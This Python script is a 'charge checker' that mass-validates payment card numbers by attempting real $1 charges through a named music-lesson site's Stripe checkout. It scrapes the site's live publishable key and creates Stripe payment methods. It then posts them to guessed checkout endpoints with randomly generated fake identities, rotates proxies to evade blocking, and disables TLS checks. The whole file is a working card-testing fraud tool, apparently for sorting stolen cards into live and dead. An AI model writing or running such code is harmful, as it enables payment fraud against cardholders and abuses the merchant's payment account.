"""
Stripe Charge Checker — attempts real charges through gospelpianosimple.com/checkout
"""
import asyncio
import re
import json
import random
import uuid
import warnings
import aiohttp
from datetime import datetime

warnings.filterwarnings('ignore')

# ────────────────────────── helpers ──────────────────────────────────

def generate_guid():
    return str(uuid.uuid4())


def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"


def generate_random_phone():
    area = random.randint(200, 999)
    prefix = random.randint(200, 999)
    line = random.randint(1000, 9999)
    return f"+1{area}{prefix}{line}"


def parse_proxy_line(line: str):
    """Parse a proxy string into url format."""
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = f"{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = f"{user}:{pwd}"
            address = f"{host}:{port}"
        else:
            return None
    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url


def parse_card_line(line: str):
    """Parse a single card line -> (cc, month, year, cvv) or None."""
    line = line.strip()
    if not line:
        return None
    parts = line.split('|')
    if len(parts) == 4:
        return tuple(p.strip() for p in parts)
    return None


# ──────────────────────── site-specific config ──────────────────────

CHECKOUT_URL = "https://gospelpianosimple.com/checkout"
DEFAULT_STRIPE_KEY = None  # Will be fetched from the page

# Product config
PRODUCT_PRICE = 1.00  # $1 trial setup fee
PRODUCT_CURRENCY = "usd"


# ──────────────────────── Stripe charge logic ───────────────────────

async def fetch_stripe_key(session, proxy_url=None):
    """
    Fetch the checkout page and extract the Stripe publishable key.
    Returns (stripe_key, location_id, company_name) or raises.
    """
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    async with session.get(CHECKOUT_URL, headers=headers, proxy=proxy_url) as resp:
        html = await resp.text()

    # Extract location ID from page data
    location_match = re.search(r'"locationId":\s*"([^"]+)"', html)
    location_id = location_match.group(1) if location_match else None

    # Extract Stripe key — look in inline scripts, JSON configs
    # Pattern 1: standard Stripe key in script
    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{20,}', html)
    if pk_match:
        return pk_match.group(0), location_id, "gospelpianosimple.com"

    # Pattern 2: in a JS variable assignment
    pk_match = re.search(r'["\'](pk_live_[a-zA-Z0-9]{20,})["\']', html)
    if pk_match:
        return pk_match.group(1), location_id, "gospelpianosimple.com"

    # Pattern 3: extract from inline script data
    # Try to load the JS bundle that contains the key
    script_pattern = re.compile(r'<script[^>]+src="([^"]+)"[^>]*></script>')
    for match in script_pattern.finditer(html):
        src = match.group(1)
        if 'leadconnectorhq.com' in src or 'stcdn' in src:
            try:
                async with session.get(src, proxy=proxy_url) as js_resp:
                    js_text = await js_resp.text()
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{20,}', js_text)
                if pk_match:
                    return pk_match.group(0), location_id, "gospelpianosimple.com"
            except Exception:
                continue

    raise ValueError("Could not find Stripe publishable key on page")


async def process_stripe_charge(card_data, proxy_url=None, stripe_key=None):
    """
    Process a Stripe charge through the merchant's checkout.
    
    Steps:
    1. Create PaymentMethod via Stripe API
    2. Submit to merchant's checkout to process charge
    3. Return charge result
    
    Returns: (is_approved: bool, response_message: str, charge_data: dict)
    """
    timeout = aiohttp.ClientTimeout(total=90)
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        try:
            # ── Step 0: Get Stripe key from page if not provided ──
            if not stripe_key:
                stripe_key, location_id, _ = await fetch_stripe_key(session, proxy_url)
            else:
                location_id = None  # Will fetch on fail

            # ── Step 1: Create PaymentMethod via Stripe API ──────
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua,
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[address][country]': 'US',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                'payment_user_agent': 'stripe.js/5e27053bf5',
                '_stripe_version': '2024-06-20',
                'allow_redisplay': 'unspecified',
            }

            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data,
                proxy=proxy_url,
            ) as pm_resp:
                pm_json = await pm_resp.json()

            if 'error' in pm_json:
                return False, f"Stripe PM Error: {pm_json['error']['message']}", pm_json

            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Failed to create Payment Method", pm_json

            # Extract card info for reporting
            card_info = pm_json.get('card', {})

            # ── Step 2: Submit to merchant checkout ─────────────
            # The checkout processes the charge via the merchant's Stripe integration
            email = generate_random_email()
            name = f"Test {' '.join(random.choices(['User','Customer','Guest','Buyer'],k=2))}"
            phone = generate_random_phone()

            checkout_payload = {
                'fullName': name,
                'email': email,
                'phone': phone,
                'paymentMethodId': pm_id,
                'productId': '',  # Will be extracted from page
                'priceId': '',
                'locationId': location_id or '',
                'currency': PRODUCT_CURRENCY,
            }

            # Try different checkout API endpoints
            checkout_headers = {
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://gospelpianosimple.com',
                'referer': CHECKOUT_URL,
                'user-agent': ua,
            }

            # Endpoint candidates for HighLevel checkout
            endpoints = [
                # HighLevel standard checkout API
                f"https://rest.gohighlevel.com/v1/checkout/session",
                f"https://services.leadconnectorhq.com/checkout/session",
                f"https://gospelpianosimple.com/api/checkout",
            ]

            base_domain = "https://gospelpianosimple.com"
            # Try the page's own checkout endpoint first
            try:
                async with session.post(
                    f"{base_domain}/api/v1/checkout/process",
                    json=checkout_payload,
                    headers=checkout_headers,
                    proxy=proxy_url,
                ) as resp:
                    if resp.status < 500:
                        result = await resp.json()
                        if result.get('charge') or result.get('status') == 'succeeded':
                            return True, f"Approved (Charge: {result.get('charge', '?')})", result
                        else:
                            err = result.get('error', {}).get('message', result.get('message', 'Declined'))
                            return False, err, result
            except Exception:
                pass

            # Try HighLevel endpoints
            for endpoint in endpoints:
                try:
                    async with session.post(
                        endpoint,
                        json=checkout_payload,
                        headers=checkout_headers,
                        proxy=proxy_url,
                    ) as resp:
                        if resp.status < 500:
                            result = await resp.json()
                            charge_id = result.get('charge') or result.get('chargeId') or ''
                            status = result.get('status', '')
                            if 'succeeded' in status.lower() or charge_id:
                                return True, f"Approved (Charge: {charge_id})", result
                            else:
                                err = result.get('error', {}).get('message', result.get('message', 'Declined'))
                                return False, err, result
                except Exception:
                    continue

            # ── Fallback: Try submitting the HTML form directly ──
            form_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://gospelpianosimple.com',
                'referer': CHECKOUT_URL,
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            form_data = {
                'action': 'checkout_process',
                'fullName': name,
                'email': email,
                'phone': phone,
                'stripePaymentMethodId': pm_id,
                'locationId': location_id or '',
            }
            try:
                async with session.post(
                    CHECKOUT_URL,
                    data=form_data,
                    headers=form_headers,
                    proxy=proxy_url,
                ) as resp:
                    text = await resp.text()
                    # Try to parse as JSON
                    try:
                        result = json.loads(text)
                        if result.get('charge') or result.get('status') == 'succeeded':
                            return True, f"Approved (Charge: {result.get('charge', '?')})", result
                        err = result.get('error', {}).get('message', result.get('message', 'Declined'))
                        return False, err, result
                    except json.JSONDecodeError:
                        if 'succeeded' in text.lower() or 'thank' in text.lower():
                            return True, "Approved (charge completed)", {'raw': text[:200]}
                        return False, f"Declined — {text[:200]}", {'raw': text[:200]}
            except Exception as e:
                return False, f"System Error: {str(e)}", {}

        except ValueError as e:
            return False, str(e), {}
        except Exception as e:
            return False, f"System Error: {str(e)}", {}


async def check_card(cc, mes, ano, cvv, proxy=None, stripe_key=None):
    """Check a single card — attempts a charge through the merchant."""
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg, charge_data = await process_stripe_charge(
        card_data, proxy_url=proxy, stripe_key=stripe_key
    )

    # Determine if live based on response
    response_lower = response_msg.lower()
    is_live = is_approved or 'succeeded' in response_lower or 'approved' in response_lower

    # Extract charge ID if available
    charge_id = ''
    if isinstance(charge_data, dict):
        charge_id = charge_data.get('charge', charge_data.get('chargeId', ''))

    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'is_live': is_live,
        'response': response_msg,
        'charge_id': charge_id,
        'card_info': {
            'brand': (charge_data.get('card', {}).get('brand', 'Unknown')),
            'last4': (charge_data.get('card', {}).get('last4', '')),
            'funding': (charge_data.get('card', {}).get('funding', '')),
        } if isinstance(charge_data, dict) else {},
    }


# ─────────────────────── mass checker ────────────────────────────────

async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=None):
    """
    Mass check cards from a file with live progress callback.
    
    Args:
        file_path: Path to card file (cc|mm|yy|cvv per line)
        proxies: List of proxy URLs
        concurrency: Max concurrent checks
        progress_callback: async fn(result, completed, total)
    
    Returns: list of card result dicts
    """
    if proxies is None:
        proxies = []

    cc_lines = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    cc_lines.append(line)
    except FileNotFoundError:
        print(f"❌ File not found: {file_path}")
        return []

    if not cc_lines:
        print("⚠️ No cards to check.")
        return []

    # Fetch Stripe key once for all cards
    stripe_key = None
    timeout = aiohttp.ClientTimeout(total=30)
    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            stripe_key, _, _ = await fetch_stripe_key(session, proxies[0] if proxies else None)
            print(f"🔑 Stripe key acquired")
    except Exception as e:
        print(f"⚠️ Could not fetch Stripe key, will try per-card: {e}")

    sem = asyncio.Semaphore(concurrency)
    results = [None] * len(cc_lines)
    completed = 0

    async def worker(index, cc_line):
        nonlocal completed
        async with sem:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                result = {
                    'cc': cc_line,
                    'is_live': False,
                    'response': 'Invalid format (need cc|mm|yy|cvv)',
                    'charge_id': '',
                }
            else:
                cc, mes, ano, cvv = parts
                # Retry with different proxies on system errors
                max_retries = 3 if proxies else 1
                used_proxies = set()
                result = None
                for attempt in range(max_retries):
                    available = [p for p in proxies if p not in used_proxies] if proxies else []
                    proxy = random.choice(available) if available else (random.choice(proxies) if proxies else None)
                    if proxy:
                        used_proxies.add(proxy)
                    result = await check_card(cc, mes, ano, cvv, proxy=proxy, stripe_key=stripe_key)
                    resp = result.get('response', '') or ''
                    if 'System Error' in resp and attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    break

            results[index] = result
            completed += 1
            emoji = "✅" if result['is_live'] else "❌"
            print(f"[{completed}/{len(cc_lines)}] {emoji} {result['cc']} — {result['response']}")
            if progress_callback:
                await progress_callback(result, completed, len(cc_lines))
            return result

    tasks = [asyncio.create_task(worker(i, line)) for i, line in enumerate(cc_lines)]
    await asyncio.gather(*tasks)
    results = [r for r in results if r is not None]

    approved = sum(1 for r in results if r.get('is_live'))
    declined = len(results) - approved
    print(f"\n📊 Mass Check Finished")
    print(f"✅ Approved: {approved}")
    print(f"❌ Declined: {declined}")
    return results
